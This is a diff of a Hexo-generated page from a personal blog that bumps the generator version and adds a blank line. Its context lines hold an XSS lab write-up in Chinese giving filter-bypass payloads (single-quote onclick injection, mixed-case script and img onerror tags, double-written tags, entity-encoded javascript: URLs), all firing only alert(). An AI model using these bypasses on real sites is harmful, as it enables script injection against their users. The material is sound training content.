@@ -59,7 +59,7 @@
     <!-- rss -->
     
     
-<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="Elli0t's Blog" type="application/atom+xml">
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Elli0t's Blog" type="application/atom+xml">
 </head>
 
 <body class="max-width mx-auto px3 ltr">
@@ -180,6 +180,7 @@
 <h4 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h4><p>htmlspecialchars()转义成HTML实体<br>但是htmlspecialchars在默认情况下不会转义单引号，需要设置quotestyle才会进行转义<br><code>&#39;onclick=&#39;window.alert()</code></p>
 <h4 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h4><p>大小写绕过</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img Src&#x3D;x Onerror&#x3D;alert(1)&gt;</span><br><span class="line">&quot;&gt;&lt;scRipt&gt;alert(&#39;xss&#39;)&lt;&#x2F;ScrIpt&gt;</span><br></pre></td></tr></table></figure>
+
 <h4 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h4><p>双写绕过<br><code>&quot;&gt;&lt;scscriptript&gt;alert(&#39;xss&#39;)&lt;/scrscriptipt&gt;</code></p>
 <h4 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h4><p>伪协议<br>编码的形式绕过<br><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/zifushiti.php">HTML字符在线实体转换</a><br><code>javascri&amp;#x70;t:alert(&#39;xss&#39;)  #HTML实体编码（HEX）</code><br>这是实体编码 entity code<br>「&amp;#」开头的后接十进制数字，「&amp;#x」开头的后接十六进制数字。</p>
 <blockquote>
